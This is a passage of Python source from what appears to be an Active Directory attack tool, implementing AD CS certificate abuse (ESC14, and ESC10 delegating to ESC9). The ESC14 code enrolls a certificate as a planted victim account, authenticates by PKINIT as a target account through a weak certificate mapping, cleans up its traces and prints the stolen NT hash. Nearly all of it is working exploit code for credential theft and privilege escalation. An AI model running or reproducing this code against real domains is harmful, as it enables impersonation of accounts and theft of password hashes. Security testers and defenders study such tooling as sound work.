                f"Failed to set {attribute} on victim {victim_dn}"
            )

        # Enroll a certificate as the victim; the DC maps it to the target.
        # Variants B/C/D are defined by the target's PRE-EXISTING weak explicit
        # mapping, matched against the victim attribute we just wrote — the CA builds
        # that identifier into the issued certificate from the directory. A
        # requester-supplied SAN UPN would switch the KDC to the implicit UPN mapping
        # (ESC1-style) and the weak explicit mapping would never be consulted, which
        # under StrongCertificateBindingEnforcement=2 fails outright. It also needs
        # ENROLLEE_SUPPLIES_SUBJECT_ALT_NAME on the template, which the ESC14 detector
        # does not require. So enroll with NO SAN UPN (same rule as variant A).
        print_info(f"ESC14: requesting certificate as victim {victim_name}...")
        _esc14_key_size = getattr(config, "min_key_size", None)
        req_cfg = CertRequestConfig(
            domain=config.auth_domain,
            kdc_ip=config.auth_kdc,
            ca_host=config.ca_host,
            ca_name=config.ca_name,
            template=config.template or "User",
            username=victim_name,
            password=victim_password,
            ca_fqdn=config.ca_fqdn,
            upn="",
            dns_server=config.dns_server,
            ledger_shell=config.shell,
            ledger_domain=config.domain,
            ledger_technique=(
                f"ADCSESC14 variant {variant}: certificate enrollment as the victim"
            ),
            **({} if _esc14_key_size is None else {"key_size": int(_esc14_key_size)}),
        )
        req = await request_certificate_native(req_cfg, out)
        if not req.success:
            raise RuntimeError(f"Certificate request failed: {req.error}")

        # Authenticate with the victim's certificate AS THE TARGET — the DC maps it
        # to the target via the target's weak altSecurityIdentities mapping.
        auth_cfg = CertAuthConfig(
            domain=config.domain,
            kdc_ip=config.dc_ip,
            pfx_path=req.pfx_path,
            pfx_password=req.pfx_password or "",
            username=config.target_account,
        )
        auth = await authenticate_with_cert_native(auth_cfg, out)
        if not auth.success:
            raise RuntimeError(f"PKINIT failed: {auth.error}")

        elevated_delete_ccache = str(auth.ccache_path) if auth.ccache_path else None

        # Clean up — restore the victim attribute and delete the victim.
        await _restore_attr()
        await _delete_victim()

        print_success(f"ESC14 variant {variant}: NT hash obtained — {auth.nt_hash}")
        from adscan_internal.services.adcs.esc_enrollment import _emit_pkinit_compromise

        _emit_pkinit_compromise(config, auth.nt_hash)
        return EscResult(
            success=True,
            esc=14,
            nt_hash=auth.nt_hash,
            ccache_path=str(auth.ccache_path) if auth.ccache_path else None,
            pfx_path=str(req.pfx_path),
            evidence={"esc14_variant": variant},
        )


async def run_esc10(config: EscConfig) -> EscResult:
    """ESC10: GenericWrite on target -> shadow creds -> NT hash -> UPN swap -> cert -> PKINIT.

    Identical flow to ESC9. The distinction is in the detection condition:
    ESC10 requires StrongCertificateBindingEnforcement=0 or CertificateMappingMethods=4
    on the DC — the exploitability check happens at detection time, not here.
    run_esc10 simply delegates to run_esc9 with esc=10 stamped on the result.
    """
    result = await run_esc9(config)
    # Re-stamp esc number so callers and UI show ESC10 correctly.
    return EscResult(
        success=result.success,
        esc=10,
        nt_hash=result.nt_hash,
        ccache_path=result.ccache_path,
        pfx_path=result.pfx_path,
        error=result.error,
        evidence=result.evidence if hasattr(result, "evidence") else {},
    )
